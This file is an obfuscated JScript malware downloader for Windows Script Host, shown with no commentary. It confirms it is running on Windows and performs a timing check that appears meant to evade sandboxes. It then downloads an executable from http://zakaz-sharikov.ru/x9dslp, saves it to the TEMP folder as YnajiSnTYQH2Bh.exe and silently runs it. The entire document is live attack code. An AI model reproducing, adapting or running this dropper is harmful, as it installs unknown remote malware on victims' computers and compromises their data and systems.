var VS = false;
var MF = "Create"+"Object";
var UB = function K0() {return WScript[MF]("WScript"+".Shell");}(), LS = 11;
var A = "MSXML2"+".XMLHTTP";
var Q0 = 2;
var LB = Q0 - 2;
function WM(Q){UB["Run"](Q, LB, LB);};
function N(){return A + "";};
function T(CF, B0){LB = LB * 1; return CF - B0;};
function Y(){return MF;};
/*@cc_on
  @if (@_win32 || @_win64)
    VS = true;
  @end
@*/
if (VS)
{
var S = "";
function G(){return 22;};
var V = 0; var LO = 0;
function F()
{
var MD = new this["Date"]();
var MP = MD["getUTCMilliseconds"]();
WScript["Sleep"](G());
var MD = new this["Date"]();
var G0 = MD["getUTCMilliseconds"]();
WScript["Sleep"](G());
var MD = new this["Date"]();
var E0 = MD["getUTCMilliseconds"]();
var V = "ZS";
V = T(G0, MP);
var LO = "X";
LO = T(E0, G0);
S = "open";
return T(V, LO);
}
var M = false;
var SM = false;
for (var PC = LB; PC < G() * 1; PC++){if (F() != LB){
M = true; 
LO = "31" + 11 * V + LO; 
SM = true; 
break;
}}
function C() {return ((M == true) && (M == SM)) ? 1 : LB;};
if (M && C() && SM){
function E() {return UB["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "YnajiSnTYQH2Bh.ex" + "e";};
 KW = N();
 RS = WScript[MF](KW);
 var W = 1;
do { 
	for (;W;){
	try {
		if (W == 1)
		{
			RS[S]("GET", "http://zakaz-sharikov.ru/x9dslp", false);
			RS["send"]();
			B = "Sleep";
			W = 2;
		}
		WScript[B](G() + 120); 
		if (RS["readystate"] < 2 * 2) continue;
		W = LB;
		function K(C0) {var F0 = (1, 2, 3, 4, 5, C0); return F0;};
		OA = WScript[Y()]("ADODB.Stream");
		KW = OA;
		KW[S]();
		KW["type"] = K(1);
		KW["write"](RS["ResponseBody"]);
		OA["position"] = K(LB);
		KW["Save" + "ToFile"](E(), 2);
		OA["cl"+"ose"]();
		FO = E();
		WM(FO);
	} catch(NC){};};
}while (W);
}
}

